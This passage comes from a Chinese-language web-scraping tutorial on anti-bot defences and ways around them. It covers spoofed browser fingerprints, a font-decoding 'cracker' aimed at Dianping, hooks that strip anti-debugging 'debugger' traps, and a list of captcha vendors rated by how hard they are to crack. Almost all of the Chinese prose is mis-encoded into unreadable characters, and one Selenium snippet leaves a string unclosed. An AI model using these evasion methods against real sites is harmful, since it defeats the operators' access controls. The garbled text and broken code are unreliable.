await page.setUserAgent(&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...&quot;);

// ä¼ªé€  Chrome å¯¹è±¡
await page.evaluateOnNewDocument(() =&gt; {
  window.chrome = {
    runtime: {},
  };
});

// ä¼ªé€ æ’ä»¶
await page.evaluateOnNewDocument(() =&gt; {
  Object.defineProperty(navigator, &quot;plugins&quot;, {
    get: () =&gt; [1, 2, 3, 4, 5],
  });
});
</code></pre>
<hr />
<h3>3. åŸºäº TLS æŒ‡çº¹çš„æ£€æµ‹</h3>
<p><strong>åŸç†</strong>: å®¢æˆ·ç«¯åœ¨ TLS æ¡æ‰‹æ—¶å‘é€çš„ Client Hello åŒ…å«å¤§é‡æŒ‡çº¹ä¿¡æ¯ï¼ˆJA3ï¼‰ã€‚</p>
<p><strong>æ£€æµ‹ä»£ç </strong> (æœåŠ¡ç«¯):</p>
<pre><code class="language-python">from scapy.all import *

def extract_ja3(packet):
    # æå– TLS Client Hello
    # ç”Ÿæˆ JA3 æŒ‡çº¹
    ja3 = f&quot;{version},{ciphers},{extensions},{curves},{formats}&quot;
    ja3_hash = hashlib.md5(ja3.encode()).hexdigest()

    # æ£€æŸ¥æ˜¯å¦åœ¨é»‘åå•ä¸­
    if ja3_hash in BLACKLIST_JA3:
        return &quot;Bot detected&quot;
</code></pre>
<p><strong>å¯¹æŠ—ç­–ç•¥</strong>:</p>
<ul>
<li>ä½¿ç”¨ <code>curl-impersonate</code> æ¨¡æ‹ŸçœŸå®æµè§ˆå™¨ TLS æŒ‡çº¹</li>
<li>ä½¿ç”¨çœŸå®æµè§ˆå™¨ï¼ˆPuppeteer/Playwrightï¼‰</li>
<li>è¯¦è§ <a href="#section-42">TLS æŒ‡çº¹è¯†åˆ«</a></li>
</ul>
<hr />
<h3>4. åŸºäº Canvas/WebGL æŒ‡çº¹</h3>
<p><strong>æ£€æµ‹ä»£ç </strong>:</p>
<pre><code class="language-javascript">function getCanvasFingerprint() {
  const canvas = document.createElement(&quot;canvas&quot;);
  const ctx = canvas.getContext(&quot;2d&quot;);
  ctx.textBaseline = &quot;top&quot;;
  ctx.font = &quot;14px Arial&quot;;
  ctx.fillText(&quot;fingerprint&quot;, 2, 2);
  return canvas.toDataURL();
}

const fingerprint = getCanvasFingerprint();
// å‘é€åˆ°æœåŠ¡å™¨éªŒè¯
</code></pre>
<p><strong>å¯¹æŠ—ç­–ç•¥</strong>: è¯¦è§ <a href="#section-41">Canvas æŒ‡çº¹æŠ€æœ¯</a></p>
<hr />
<h3>5. èœœç½æŠ€æœ¯ (Honeypot)</h3>
<p><strong>åŸç†</strong>: åœ¨é¡µé¢ä¸­éšè—å¯¹ç”¨æˆ·ä¸å¯è§ã€ä½†çˆ¬è™«ä¼šæŠ“å–çš„é“¾æ¥ã€‚</p>
<p><strong>å®ç°</strong>:</p>
<pre><code class="language-html">&lt;!-- éšè—é“¾æ¥ --&gt;
&lt;a href=&quot;/trap&quot; style=&quot;display:none;&quot;&gt;Hidden Link&lt;/a&gt;

&lt;!-- CSS éšè— --&gt;
&lt;style&gt;
  .trap {
    position: absolute;
    left: -9999px;
  }
&lt;/style&gt;
&lt;a href=&quot;/trap&quot; class=&quot;trap&quot;&gt;Trap&lt;/a&gt;
</code></pre>
<p><strong>æœåŠ¡ç«¯å¤„ç†</strong>:</p>
<pre><code class="language-python">@app.route('/trap')
def honeypot():
    # è®°å½•è®¿é—®è€… IPï¼Œæ ‡è®°ä¸ºçˆ¬è™«
    blacklist.add(request.remote_addr)
    return &quot;Gotcha!&quot;
</code></pre>
<p><strong>å¯¹æŠ—ç­–ç•¥</strong>:</p>
<ul>
<li>åªæå–å¯è§å†…å®¹</li>
<li>æ£€æŸ¥å…ƒç´ çš„ CSS æ ·å¼ï¼ˆ<code>display</code>, <code>visibility</code>, <code>opacity</code>ï¼‰</li>
</ul>
<pre><code class="language-javascript">function isVisible(element) {
  return (
    element.offsetWidth &gt; 0 &amp;&amp;
    element.offsetHeight &gt; 0 &amp;&amp;
    getComputedStyle(element).visibility !== &quot;hidden&quot;
  );
}
</code></pre>
<hr />
<h3>6. CSS åçˆ¬æŠ€æœ¯</h3>
<h4>6.1 CSS åç§»éšè—</h4>
<p><strong>åŸç†</strong>: ä½¿ç”¨ CSS æ ·å¼å°†çœŸå®å†…å®¹åç§»åˆ°ä¸å¯è§åŒºåŸŸï¼Œé¡µé¢ä¸Šæ˜¾ç¤ºçš„æ˜¯ä¼ªé€ æ•°æ®ã€‚</p>
<p><strong>å®ç°ç¤ºä¾‹</strong>:</p>
<pre><code class="language-html">&lt;style&gt;
  .price {
    position: relative;
  }
  .price .real {
    position: absolute;
    left: -9999px;
  }
  .price .fake {
    position: relative;
  }
&lt;/style&gt;

&lt;div class=&quot;price&quot;&gt;
  &lt;span class=&quot;real&quot;&gt;Â¥199&lt;/span&gt;
  &lt;span class=&quot;fake&quot;&gt;Â¥9999&lt;/span&gt;
&lt;/div&gt;
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>:</p>
<ul>
<li>é¡µé¢æºç ä¸­æ˜¾ç¤ºå‡æ•°æ®</li>
<li>çœŸå®æ•°æ®é€šè¿‡ CSS å®šä½éšè—</li>
<li>æ­£å¸¸ç”¨æˆ·çœ‹åˆ°çš„æ˜¯çœŸå®æ•°æ®</li>
</ul>
<p><strong>å¯¹æŠ—ç­–ç•¥</strong>:</p>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.common.by import By

driver = webdriver.Chrome()
driver.get('https://example.com')

# è·å–å…ƒç´ 
element = driver.find_element(By.CLASS_NAME, 'price')

# è·å–æ¸²æŸ“åçš„å¯è§æ–‡æœ¬ï¼ˆä¼šè·å–åˆ°çœŸå®æ•°æ®ï¼‰
visible_text = element.text

# æˆ–ä½¿ç”¨ JavaScript è·å–è®¡ç®—åçš„æ ·å¼
script = &quot;&quot;&quot;
var element = arguments[0];
var style = window.getComputedStyle(element);
if (style.display !== 'none' &amp;&amp;
    style.visibility !== 'hidden' &amp;&amp;
    style.opacity !== '0' &amp;&amp;
    parseInt(style.left) &gt; -1000) {
    return element.innerText;
}
return null;
</code></pre>
<h4>6.2 å­—ä½“åçˆ¬æŠ€æœ¯</h4>
<p><strong>åŸç†</strong>: é€šè¿‡è‡ªå®šä¹‰å­—ä½“æ–‡ä»¶ï¼ˆ@font-faceï¼‰ï¼Œå°†é¡µé¢æ–‡æœ¬å­—ç¬¦æ˜ å°„åˆ°å­—ä½“æ–‡ä»¶ä¸­çš„ä¸åŒå­—å½¢ï¼Œä½¿å¾—çˆ¬è™«æŠ“å–åˆ°çš„æ–‡å­—ä¸å®é™…æ˜¾ç¤ºçš„æ–‡å­—ä¸ä¸€è‡´ã€‚</p>
<p><strong>å…¸å‹æ¡ˆä¾‹</strong>: çŒ«çœ¼ç”µå½±ã€å¤§ä¼—ç‚¹è¯„ã€58 åŒåŸã€æ±½è½¦ä¹‹å®¶ã€å¤©çœ¼æŸ¥ã€èµ·ç‚¹ä¸­æ–‡ç½‘</p>
<p><strong>å®ç°æœºåˆ¶</strong>:</p>
<pre><code class="language-html">&lt;!-- HTML ä¸­æ˜¾ç¤ºçš„æ˜¯ä¹±ç æˆ–ç‰¹æ®Šç¼–ç  --&gt;
&lt;span class=&quot;rating&quot;&gt;&amp;#xe601;&amp;#xe602;&amp;#xe603;&lt;/span&gt;

&lt;!-- CSS å¼•å…¥è‡ªå®šä¹‰å­—ä½“ --&gt;
&lt;style&gt;
  @font-face {
    font-family: &quot;CustomFont&quot;;
    src: url(&quot;/fonts/custom_12345.woff&quot;) format(&quot;woff&quot;);
  }
  .rating {
    font-family: &quot;CustomFont&quot;;
  }
&lt;/style&gt;
</code></pre>
<p><strong>å­—ä½“æ–‡ä»¶ç»“æ„</strong>:</p>
<pre><code>WOFF å­—ä½“æ–‡ä»¶
â”œâ”€â”€ cmap è¡¨ (å­—ç¬¦æ˜ å°„è¡¨)
â”‚   â”œâ”€â”€ &amp;#xe601; â†’ &quot;8&quot;
â”‚   â”œâ”€â”€ &amp;#xe602; â†’ &quot;.&quot;
â”‚   â””â”€â”€ &amp;#xe603; â†’ &quot;5&quot;
â”œâ”€â”€ glyf è¡¨ (å­—å½¢è½®å»“)
â”‚   â”œâ”€â”€ glyph_001 (æ•°å­— 8 çš„è½®å»“)
â”‚   â”œâ”€â”€ glyph_002 (ç‚¹å·çš„è½®å»“)
â”‚   â””â”€â”€ glyph_003 (æ•°å­— 5 çš„è½®å»“)
</code></pre>
<p><strong>ç ´è§£æ–¹æ³•</strong>:</p>
<p><strong>æ–¹æ³• 1: å­—ä½“æ–‡ä»¶è§£æ</strong></p>
<pre><code class="language-python">from fontTools.ttLib import TTFont
import requests
import re

# 1. ä»é¡µé¢æå–å­—ä½“æ–‡ä»¶ URL
def extract_font_url(html):
    pattern = r'url\([&quot;\']?(/fonts/[^&quot;\']+\.woff[^&quot;\']*)[&quot;\']?\)'
    match = re.search(pattern, html)
    return match.group(1) if match else None

# 2. ä¸‹è½½å­—ä½“æ–‡ä»¶
font_url = 'https://example.com/fonts/custom.woff'
response = requests.get(font_url)
with open('custom.woff', 'wb') as f:
    f.write(response.content)

# 3. è§£æå­—ä½“æ–‡ä»¶
font = TTFont('custom.woff')

# 4. æå–å­—ç¬¦æ˜ å°„
cmap = font.getBestCmap()  # è·å–æœ€ä½³å­—ç¬¦æ˜ å°„è¡¨

# 5. æå–å­—å½¢åæ ‡
def get_glyph_outline(font, glyph_name):
    &quot;&quot;&quot;è·å–å­—å½¢è½®å»“åæ ‡&quot;&quot;&quot;
    glyf_table = font['glyf']
    glyph = glyf_table[glyph_name]
    if glyph.isComposite():
        return None  # è·³è¿‡å¤åˆå­—å½¢
    coordinates = []
    if hasattr(glyph, 'coordinates'):
        for x, y in glyph.coordinates:
            coordinates.append((x, y))
    return coordinates

# 6. å»ºç«‹å­—å½¢ä¸çœŸå®å­—ç¬¦çš„æ˜ å°„
font_map = {}
for unicode_val, glyph_name in cmap.items():
    outline = get_glyph_outline(font, glyph_name)
    # é€šè¿‡æ¯”å¯¹åæ ‡è¯†åˆ«çœŸå®å­—ç¬¦
    # è¿™é‡Œéœ€è¦é¢„å…ˆå»ºç«‹æ ‡å‡†å­—å½¢åº“
    real_char = recognize_char_by_outline(outline)
    font_map[chr(unicode_val)] = real_char

print(font_map)
# {'\ue601': '8', '\ue602': '.', '\ue603': '5'}

# 7. è§£å¯†æ–‡æœ¬
def decrypt_text(encrypted_text, font_map):
    decrypted = ''
    for char in encrypted_text:
        decrypted += font_map.get(char, char)
    return decrypted

encrypted = '&amp;#xe601;&amp;#xe602;&amp;#xe603;'  # HTML å®ä½“
decrypted = decrypt_text(encrypted, font_map)
print(decrypted)  # &quot;8.5&quot;
</code></pre>
<p><strong>æ–¹æ³• 2: OCR è¯†åˆ«ï¼ˆé’ˆå¯¹åŠ¨æ€å­—ä½“ï¼‰</strong></p>
<pre><code class="language-python">from selenium import webdriver
from PIL import Image
import pytesseract
from io import BytesIO

def ocr_screenshot(url, selector):
    &quot;&quot;&quot;æˆªå›¾å¹¶ OCR è¯†åˆ«&quot;&quot;&quot;
    driver = webdriver.Chrome()
    driver.get(url)

    # å®šä½å…ƒç´ 
    element = driver.find_element(By.CSS_SELECTOR, selector)

    # æˆªå–å…ƒç´ æˆªå›¾
    screenshot = element.screenshot_as_png
    image = Image.open(BytesIO(screenshot))

    # OCR è¯†åˆ«
    text = pytesseract.image_to_string(image, lang='chi_sim+eng')

    driver.quit()
    return text.strip()
</code></pre>
<p><strong>æ–¹æ³• 3: å­—å½¢ç›¸ä¼¼åº¦åŒ¹é…</strong></p>
<pre><code class="language-python">import numpy as np
from fontTools.pens.recordingPen import RecordingPen

def calculate_similarity(outline1, outline2):
    &quot;&quot;&quot;è®¡ç®—ä¸¤ä¸ªå­—å½¢è½®å»“çš„ç›¸ä¼¼åº¦&quot;&quot;&quot;
    # å°†åæ ‡åºåˆ—è½¬æ¢ä¸ºå‘é‡
    vec1 = np.array(outline1).flatten()
    vec2 = np.array(outline2).flatten()

    # å½’ä¸€åŒ–
    vec1 = vec1 / np.linalg.norm(vec1)
    vec2 = vec2 / np.linalg.norm(vec2)

    # è®¡ç®—ä½™å¼¦ç›¸ä¼¼åº¦
    similarity = np.dot(vec1, vec2)
    return similarity

# å»ºç«‹æ ‡å‡†å­—å½¢åº“ï¼ˆéœ€æå‰å‡†å¤‡ï¼‰
standard_glyphs = {
    '0': [(10, 20), (30, 20), ...],
    '1': [(15, 5), (15, 35), ...],
    # ... å…¶ä»–å­—ç¬¦
}

def recognize_char_by_outline(outline):
    &quot;&quot;&quot;é€šè¿‡è½®å»“è¯†åˆ«å­—ç¬¦&quot;&quot;&quot;
    max_similarity = 0
    recognized_char = ''

    for char, std_outline in standard_glyphs.items():
        similarity = calculate_similarity(outline, std_outline)
        if similarity &gt; max_similarity:
            max_similarity = similarity
            recognized_char = char

    return recognized_char if max_similarity &gt; 0.8 else '?'
</code></pre>
<p><strong>è¿›é˜¶å¯¹æŠ—: åŠ¨æ€å­—ä½“åçˆ¬</strong></p>
<p>æŸäº›ç½‘ç«™ï¼ˆå¦‚å¤§ä¼—ç‚¹è¯„ï¼‰ä½¿ç”¨<strong>åŠ¨æ€å­—ä½“</strong>ï¼Œæ¯æ¬¡è®¿é—®å­—ä½“æ–‡ä»¶çš„æ˜ å°„å…³ç³»éƒ½ä¸åŒï¼š</p>
<pre><code class="language-python"># è®¿é—® 1ï¼š&amp;#xe601; â†’ &quot;8&quot;
# è®¿é—® 2ï¼š&amp;#xe601; â†’ &quot;3&quot;  ï¼ˆæ˜ å°„å…³ç³»æ”¹å˜ï¼‰
</code></pre>
<p><strong>ç ´è§£æ–¹æ³•</strong>:</p>
<ul>
<li><strong>å®æ—¶è§£æ</strong>: æ¯æ¬¡è¯·æ±‚éƒ½é‡æ–°ä¸‹è½½å­—ä½“æ–‡ä»¶å¹¶è§£æ</li>
<li><strong>æœºå™¨å­¦ä¹ </strong>: è®­ç»ƒ CNN æ¨¡å‹è¯†åˆ«å­—å½¢</li>
<li><strong>OCR æ–¹æ¡ˆ</strong>: ä½¿ç”¨ Selenium æ¸²æŸ“åæˆªå›¾ OCR</li>
</ul>
<p><strong>å‚è€ƒæ¡ˆä¾‹åˆ†æ</strong>: å¤§ä¼—ç‚¹è¯„è¯„åˆ†å­—ä½“ç ´è§£</p>
<pre><code class="language-python">import requests
from fontTools.ttLib import TTFont
import re

class DianpingFontCracker:
    def __init__(self):
        self.base_font = None  # åŸºå‡†å­—ä½“ï¼ˆå›ºå®šæ˜ å°„ï¼‰
        self.current_font = None  # å½“å‰é¡µé¢å­—ä½“

    def download_font(self, url):
        &quot;&quot;&quot;ä¸‹è½½å­—ä½“æ–‡ä»¶&quot;&quot;&quot;
        response = requests.get(url)
        with open('temp.woff', 'wb') as f:
            f.write(response.content)
        return TTFont('temp.woff')

    def extract_font_url(self, html):
        &quot;&quot;&quot;ä» HTML ä¸­æå–å­—ä½“ URL&quot;&quot;&quot;
        pattern = r'url\(&quot;(.*?\.woff)&quot;\)'
        match = re.search(pattern, html)
        return match.group(1) if match else None

    def build_mapping(self, font, base_font):
        &quot;&quot;&quot;é€šè¿‡å¯¹æ¯”åŸºå‡†å­—ä½“å»ºç«‹æ˜ å°„&quot;&quot;&quot;
        mapping = {}

        for code in font.getBestCmap():
            glyph_name = font.getBestCmap()[code]
            outline = self.get_outline(font, glyph_name)

            # ä¸åŸºå‡†å­—ä½“å¯¹æ¯”
            for base_code, base_glyph in base_font.getBestCmap().items():
                base_outline = self.get_outline(base_font, base_glyph)

                if self.is_similar(outline, base_outline):
                    # åŸºå‡†å­—ä½“çš„å­—ç¬¦æ˜¯å·²çŸ¥çš„
                    real_char = chr(base_code)
                    mapping[chr(code)] = real_char
                    break

        return mapping

    def get_outline(self, font, glyph_name):
        &quot;&quot;&quot;è·å–å­—å½¢è½®å»“&quot;&quot;&quot;
        glyf = font['glyf'][glyph_name]
        if hasattr(glyf, 'coordinates'):
            return list(glyf.coordinates)
        return []

    def is_similar(self, outline1, outline2, threshold=0.9):
        &quot;&quot;&quot;åˆ¤æ–­ä¸¤ä¸ªè½®å»“æ˜¯å¦ç›¸ä¼¼&quot;&quot;&quot;
        if len(outline1) != len(outline2):
            return False
        return calculate_similarity(outline1, outline2) &gt; threshold

    def decrypt(self, html_content):
        &quot;&quot;&quot;è§£å¯†é¡µé¢å†…å®¹&quot;&quot;&quot;
        # 1. æå–å­—ä½“ URL
        font_url = self.extract_font_url(html_content)

        # 2. ä¸‹è½½å­—ä½“
        current_font = self.download_font(font_url)

        # 3. å»ºç«‹æ˜ å°„
        mapping = self.build_mapping(current_font, self.base_font)

        # 4. æ›¿æ¢åŠ å¯†æ–‡æœ¬
        decrypted_html = html_content
        for enc_char, real_char in mapping.items():
            decrypted_html = decrypted_html.replace(enc_char, real_char)

        return decrypted_html
</code></pre>
<p><strong>èµ„æº</strong>:</p>
<ul>
<li><a href="https://cuiqingcai.com/6431.html">ä»Šå¤©ï¼Œæˆ‘ç»ˆäºå¼„æ‡‚äº†å­—ä½“åçˆ¬æ˜¯ä¸ªå•¥ç©æ„ï¼</a></li>
<li><a href="https://blog.csdn.net/m0_49077792/article/details/111369149">ç»ˆäºè§£å†³å¤§ä¼—ç‚¹è¯„çš„å­—ä½“åçˆ¬äº†ï¼</a></li>
<li><a href="https://blog.csdn.net/xing851483876/article/details/82928607">Python çˆ¬è™«å…­ï¼šå­—ä½“åçˆ¬å¤„ç†ï¼ˆçŒ«çœ¼+æ±½è½¦ä¹‹å®¶ï¼‰</a></li>
</ul>
<hr />
<h3>7. JavaScript åè°ƒè¯•æŠ€æœ¯</h3>
<h4>7.1 æ— é™ Debugger å¾ªç¯</h4>
<p><strong>åŸç†</strong>: ä½¿ç”¨ <code>debugger</code> è¯­å¥é…åˆå®šæ—¶å™¨æˆ–é€’å½’ï¼ŒæŒç»­æš‚åœ JavaScript æ‰§è¡Œã€‚</p>
<p><strong>å®ç°æ–¹å¼</strong>:</p>
<p><strong>æ–¹å¼ 1: ç›´æ¥å¾ªç¯</strong></p>
<pre><code class="language-javascript">setInterval(function () {
  debugger;
}, 100);
</code></pre>
<p><strong>æ–¹å¼ 2: è‡ªæ‰§è¡Œå‡½æ•°</strong></p>
<pre><code class="language-javascript">(function () {
  function detect() {
    debugger;
    detect();
  }
  detect();
})();
</code></pre>
<p><strong>æ–¹å¼ 3: eval/Function åŠ¨æ€æ‰§è¡Œ</strong></p>
<pre><code class="language-javascript">setInterval(function () {
  (function () {
    return false;
  })
    [&quot;constructor&quot;](&quot;debugger&quot;)
    [&quot;call&quot;]();
}, 50);

// æˆ–ä½¿ç”¨ eval
setInterval(function () {
  eval(&quot;debugger&quot;);
}, 50);
</code></pre>
<p><strong>æ–¹å¼ 4: æ—¶é—´æ£€æµ‹</strong></p>
<pre><code class="language-javascript">setInterval(function () {
  var start = new Date();
  debugger;
  var end = new Date();

  // æ£€æµ‹æ—¶é—´å·®ï¼Œåˆ¤æ–­æ˜¯å¦åœ¨è°ƒè¯•
  if (end - start &gt; 100) {
    console.log(&quot;Developer tools detected!&quot;);
    // æ¸…ç©ºé¡µé¢æˆ–é‡å®šå‘
    document.body.innerHTML = &quot;&quot;;
    window.location.href = &quot;about:blank&quot;;
  }
}, 1000);
</code></pre>
<h4>7.2 ç»•è¿‡åè°ƒè¯•çš„æ–¹æ³•</h4>
<p><strong>æ–¹æ³• 1: ç¦ç”¨æ‰€æœ‰æ–­ç‚¹</strong></p>
<p>Chrome DevTools æ“ä½œ:</p>
<ol>
<li>æ‰“å¼€ Sources é¢æ¿</li>
<li>ç‚¹å‡»å³ä¾§çš„&quot;Deactivate breakpoints&quot;æŒ‰é’®ï¼ˆå¿«æ·é”® Ctrl+F8ï¼‰</li>
<li>æ‰€æœ‰ debugger è¯­å¥å°†è¢«å¿½ç•¥</li>
</ol>
<p><strong>æ–¹æ³• 2: Never Pause Here (æ°¸ä¸åœ¨æ­¤æš‚åœ)</strong></p>
<pre><code>1. åœ¨ debugger è¡Œå³é”®
2. é€‰æ‹© &quot;Never pause here&quot;
3. è¯¥è¡Œçš„ debugger å°†è¢«å¿½ç•¥
</code></pre>
<p><strong>æ–¹æ³• 3: æ¡ä»¶æ–­ç‚¹è¦†ç›–</strong></p>
<pre><code>1. åœ¨ debugger è¡Œè®¾ç½®æ¡ä»¶æ–­ç‚¹
2. æ¡ä»¶è®¾ä¸º false
3. æ–­ç‚¹å°†æ°¸ä¸è§¦å‘
</code></pre>
<p><strong>æ–¹æ³• 4: Hook Function æ„é€ å™¨</strong></p>
<pre><code class="language-javascript">// åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥ï¼ˆé€šè¿‡æµè§ˆå™¨æ‰©å±•æˆ– Fiddlerï¼‰
(function () {
  var originalFunction = window.Function;
  window.Function = function () {
    var args = Array.prototype.slice.call(arguments);
    var code = args[args.length - 1];

    // æ£€æµ‹å¹¶ç§»é™¤ debugger
    if (code &amp;&amp; typeof code === &quot;string&quot; &amp;&amp; code.includes(&quot;debugger&quot;)) {
      console.log(&quot;Blocked debugger:&quot;, code);
      args[args.length - 1] = code.replace(/debugger/g, &quot;&quot;);
    }

    return originalFunction.apply(this, args);
  };

  // å¤„ç† eval
  var originalEval = window.eval;
  window.eval = function (code) {
    if (typeof code === &quot;string&quot; &amp;&amp; code.includes(&quot;debugger&quot;)) {
      console.log(&quot;Blocked eval debugger:&quot;, code);
      code = code.replace(/debugger/g, &quot;&quot;);
    }
    return originalEval.call(this, code);
  };
})();
</code></pre>
<p><strong>æ–¹æ³• 5: æœ¬åœ°æ–‡ä»¶æ›¿æ¢</strong></p>
<p>ä½¿ç”¨ Fiddler/Charles æ›¿æ¢ JavaScript æ–‡ä»¶:</p>
<pre><code class="language-javascript">// 1. ä¿å­˜åŸå§‹ JS æ–‡ä»¶
// 2. ç§»é™¤æ‰€æœ‰ debugger è¯­å¥
// 3. ä½¿ç”¨ Fiddler AutoResponder æ›¿æ¢

// Fiddler AutoResponder è§„åˆ™:
// REGEX:https://example.com/js/protect.js
// æœ¬åœ°æ–‡ä»¶è·¯å¾„: C:\temp\protect_cracked.js
</code></pre>
<p><strong>æ–¹æ³• 6: Chrome DevTools Protocol (CDP)</strong></p>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.chrome.options import Options

chrome_options = Options()
chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
chrome_options.add_experimental_option('useAutomationExtension', False)

driver = webdriver.Chrome(options=chrome_options)

# ç¦ç”¨ debugger
driver.execute_cdp_cmd('Debugger.disable', {})

# è®¾ç½®æ–­ç‚¹è¡Œä¸º
driver.execute_cdp_cmd('Debugger.setBreakpointsActive', {'active': False})

driver.get('https://example.com')
</code></pre>
<p><strong>æ–¹æ³• 7: é‡å†™ debugger (Proxy)</strong></p>
<pre><code class="language-javascript">// ä½¿ç”¨ Proxy æ‹¦æˆª debugger
(function () {
  var handler = {
    construct: function (target, args) {
      var code = args[args.length - 1];
      if (typeof code === &quot;string&quot;) {
        code = code.replace(/debugger/g, &quot;&quot;);
        args[args.length - 1] = code;
      }
      return new target(...args);
    },
  };

  window.Function = new Proxy(Function, handler);
})();
</code></pre>
<p><strong>å‚è€ƒèµ„æº</strong>:</p>
<ul>
<li><a href="https://blog.csdn.net/Revivedsun/article/details/105448505">æµè§ˆå™¨åè°ƒè¯•ç»•è¿‡æ— é™ debugger åŠä»£ç æ‰§è¡Œå™¨æ£€æµ‹</a></li>
<li><a href="https://blog.csdn.net/wh445306/article/details/103638742">ç»•è¿‡ JavaScript debugger ä¸‰ç§è§£å†³æ–¹æ³•</a></li>
<li><a href="https://cloud.tencent.com/developer/article/2242577">JS é€†å‘ï¼šå¸¸è§æ— é™ Debugger ä»¥åŠç»•è¿‡æ–¹æ³•</a></li>
<li><a href="https://tree.moe/anti-debug-and-solution/">å‡ ç§å¸¸è§çš„å‰ç«¯åè°ƒè¯•æ–¹æ³•åŠçªç ´æ–¹å¼</a></li>
</ul>
<h4>7.3 æ£€æµ‹å¼€å‘è€…å·¥å…·</h4>
<p><strong>æ£€æµ‹æ–¹æ³• 1: çª—å£å°ºå¯¸æ£€æµ‹</strong></p>
<pre><code class="language-javascript">function detectDevTools() {
  var widthThreshold = window.outerWidth - window.innerWidth &gt; 160;
  var heightThreshold = window.outerHeight - window.innerHeight &gt; 160;

  if (widthThreshold || heightThreshold) {
    console.log(&quot;DevTools detected!&quot;);
    return true;
  }
  return false;
}

setInterval(detectDevTools, 1000);
</code></pre>
<p><strong>æ£€æµ‹æ–¹æ³• 2: console.log æ—¶é—´æ£€æµ‹</strong></p>
<pre><code class="language-javascript">var devtools = { open: false };

var checkStatus = function () {
  var element = new Image();
  Object.defineProperty(element, &quot;id&quot;, {
    get: function () {
      devtools.open = true;
    },
  });

  console.log(&quot;%c&quot;, element);
  console.clear();
};

setInterval(function () {
  devtools.open = false;
  checkStatus();

  if (devtools.open) {
    console.log(&quot;DevTools detected!&quot;);
    // æ‰§è¡Œååˆ¶æªæ–½
  }
}, 1000);
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>: ä½¿ç”¨æ— å¤´æµè§ˆå™¨æˆ–ç¦ç”¨ console è¾“å‡º</p>
<pre><code class="language-javascript">// Hook console.log
console.log = function () {};
console.warn = function () {};
console.error = function () {};
</code></pre>
<hr />
<h3>8. éªŒè¯ç æŠ€æœ¯</h3>
<h4>8.1 éªŒè¯ç ç±»å‹</h4>
<p>ç°ä»£éªŒè¯ç ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç±»:</p>
<ol>
<li><strong>å›¾å½¢éªŒè¯ç </strong>: æœ€ä¼ ç»Ÿçš„éªŒè¯ç ï¼ŒåŒ…å«æ‰­æ›²æ–‡å­—ã€å™ªç‚¹ç­‰</li>
<li><strong>æ»‘å—éªŒè¯ç </strong>: æ‹–åŠ¨æ»‘å—æ‹¼åˆå›¾ç‰‡ï¼ˆå¦‚æéªŒã€ç½‘æ˜“æ˜“ç›¾ï¼‰</li>
<li><strong>ç‚¹é€‰éªŒè¯ç </strong>: æŒ‰é¡ºåºç‚¹å‡»ç‰¹å®šæ–‡å­—æˆ–ç‰©ä½“</li>
<li><strong>è¡Œä¸ºéªŒè¯ç </strong>: åˆ†æç”¨æˆ·è¡Œä¸ºè½¨è¿¹ï¼ˆé¼ æ ‡ç§»åŠ¨ã€ç‚¹å‡»æ¨¡å¼ï¼‰</li>
<li><strong>æ™ºèƒ½éªŒè¯ç </strong>: æ— æ„ŸéªŒè¯ï¼Œé€šè¿‡è®¾å¤‡æŒ‡çº¹å’Œè¡Œä¸ºåˆ†æåˆ¤æ–­</li>
</ol>
<h4>8.2 ä¸»æµéªŒè¯ç æœåŠ¡å•†</h4>
<table>
<thead>
<tr>
  <th>æœåŠ¡å•†</th>
  <th>ç±»å‹</th>
  <th>ç‰¹ç‚¹</th>
  <th>ç ´è§£éš¾åº¦</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>æéªŒ (GeeTest)</strong></td>
  <td>æ»‘å—ã€ç‚¹é€‰ã€æ™ºèƒ½</td>
  <td>è¡Œä¸ºè½¨è¿¹åˆ†æã€å¤šç»´åº¦é£æ§</td>
  <td>â˜…â˜…â˜…â˜…â˜…</td>
</tr>
<tr>
  <td><strong>ç½‘æ˜“æ˜“ç›¾</strong></td>
  <td>æ»‘å—ã€ç‚¹é€‰ã€æ™ºèƒ½</td>
  <td>å›¾åƒä¹±åºã€èƒŒæ™¯èåˆ</td>
  <td>â˜…â˜…â˜…â˜…â˜…</td>
</tr>
<tr>
  <td><strong>é˜¿é‡Œäº‘ç›¾</strong></td>
  <td>æ»‘å—ã€æ™ºèƒ½</td>
  <td>é£æ§å¼•æ“ã€è®¾å¤‡æŒ‡çº¹</td>
  <td>â˜…â˜…â˜…â˜…â˜…</td>
</tr>
<tr>
  <td><strong>è…¾è®¯å¤©å¾¡</strong></td>
  <td>æ»‘å—ã€ç‚¹é€‰ã€æ™ºèƒ½</td>
  <td>äº¤äº’åŠ¨æ€åŠ è½½</td>
  <td>â˜…â˜…â˜…â˜…â˜…</td>
</tr>
<tr>
  <td><strong>ç‚¹è§¦éªŒè¯ç </strong></td>
  <td>æ»‘å—ã€ç‚¹é€‰</td>
  <td>å¤šç§éªŒè¯æ–¹å¼</td>
  <td>â˜…â˜…â˜…â˜…â˜†</td>
</tr>
<tr>
  <td><strong>Google reCAPTCHA v3</strong></td>
  <td>æ™ºèƒ½</td>
  <td>æ— æ„ŸéªŒè¯ã€é£é™©è¯„åˆ†</td>
  <td>â˜…â˜…â˜…â˜…â˜†</td>
</tr>
</tbody>
</table>
<h4>8.3 æ»‘å—éªŒè¯ç åŸç†ä¸ç ´è§£</h4>
<p><strong>æéªŒæ»‘å—éªŒè¯ç å·¥ä½œæµç¨‹</strong>:</p>
<pre><code>1. ç”¨æˆ·è®¿é—®é¡µé¢
2. åŠ è½½éªŒè¯ç ç»„ä»¶
3. æ˜¾ç¤ºç¼ºå£å›¾ç‰‡å’Œæ»‘å—
4. ç”¨æˆ·æ‹–åŠ¨æ»‘å—
5. è®°å½•è½¨è¿¹æ•°æ®ï¼š
   - é¼ æ ‡ç§»åŠ¨è½¨è¿¹
   - é€Ÿåº¦å˜åŒ–
   - åŠ é€Ÿåº¦
   - æ—¶é—´æˆ³
6. æäº¤è½¨è¿¹åˆ°æœåŠ¡å™¨éªŒè¯
7. æœåŠ¡å™¨åˆ†æè¡Œä¸ºç‰¹å¾ï¼š
   - è½¨è¿¹æ˜¯å¦å¹³æ»‘
   - é€Ÿåº¦æ˜¯å¦è‡ªç„¶
